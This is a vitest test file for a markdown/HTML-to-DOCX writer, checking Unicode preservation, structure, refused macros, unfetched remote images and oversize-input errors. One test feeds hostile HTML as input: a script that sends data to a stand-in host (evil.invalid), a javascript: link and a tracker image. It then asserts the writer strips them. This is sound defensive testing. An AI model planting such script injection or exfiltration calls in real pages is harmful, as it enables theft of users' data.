import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import { unzipSync, strFromU8 } from "fflate";
import { OoxmlPackageError } from "../src/engines/ooxml/package";
import { extractDocxSemantics, generateDocxFromSemanticText } from "../src/engines/ooxml/office-semantics";

describe("STR-290 donor docx 9.12.0 semantic writer", () => {
  it("preserves literal unicode, headings, links, ordered/bullet lists, tables and original input", async () => {
    const source = [
      "# Città 😀", "",
      "Valore è & <tag> con [sito](https://example.com/?a=1&b=2).",
      "", "- punto", "1. numero", "",
      "| codice | emoji |", "| --- | --- |", "| 001 | 🌟 |",
      "", "![foto](https://example.invalid/no-fetch.png)",
    ].join("\n");
    const before = createHash("sha256").update(source).digest("hex");
    const result = await generateDocxFromSemanticText(source, "markdown");
    expect(result.reopened.blocks).toEqual(expect.arrayContaining([
      expect.objectContaining({ type: "heading", level: 1, text: "Città 😀" }),
      expect.objectContaining({ type: "table", rows: [["codice", "emoji"], ["001", "🌟"]] }),
      expect.objectContaining({ type: "list-item", ordered: false, text: "punto" }),
      expect.objectContaining({ type: "list-item", ordered: true, text: "numero" }),
    ]));
    expect(result.reopened.markdown).toContain("[sito](https://example.com/?a=1&b=2)");
    expect(result.reopened.text).toContain("Valore è & <tag>");
    expect(result.unsupportedConstructs).toContain("Markdown image references are represented as text placeholders; image bytes are not fetched or embedded.");
    expect(result.reopened.assets).toHaveLength(0);
    expect(result.output.macroPolicy).toBe("refused");
    expect(createHash("sha256").update(source).digest("hex")).toEqual(before);
    const members = unzipSync(new Uint8Array(result.bytes));
    expect(Object.keys(members).some((key) => /vba|word\/media/u.test(key))).toBe(false);
    expect(strFromU8(members["word/document.xml"]!)).not.toContain("no-fetch.png");
    expect((await extractDocxSemantics(result.bytes)).structureCounts).toEqual(result.reopened.structureCounts);
  });

  it("omits hostile HTML and never includes remote image bytes or unsafe link relationships", async () => {
    const html = '<h3>Titolo</h3><script>fetch("https://evil.invalid/upload")</script><p>Buono <a href="javascript:alert(1)">no</a> <a href="https://example.org/a">sì</a></p><img src="https://evil.invalid/tracker" alt="immagine">';
    const result = await generateDocxFromSemanticText(html, "html");
    expect(result.reopened.text).toContain("Titolo");
    expect(result.reopened.text).not.toContain("fetch(");
    expect(result.reopened.assets).toEqual([]);
    expect(result.unsupportedConstructs).toEqual(expect.arrayContaining([
      "HTML <script> content is omitted and never executed.",
      "HTML links with unsupported or unsafe schemes are reduced to visible text.",
    ]));
    const members = unzipSync(new Uint8Array(result.bytes));
    const rels = strFromU8(members["word/_rels/document.xml.rels"]!);
    expect(rels).not.toContain("javascript:");
    expect(rels).not.toContain("evil.invalid");
    expect(rels).toContain("https://example.org/a");
  });

  it("rejects over-limit source with the existing typed error before loading donor", async () => {
    const huge = "a".repeat(2 * 1024 * 1024 + 1);
    await expect(generateDocxFromSemanticText(huge, "text")).rejects.toMatchObject({
      name: "OoxmlPackageError", code: "PACKAGE_TOO_LARGE",
    } satisfies Partial<OoxmlPackageError>);
  });
});
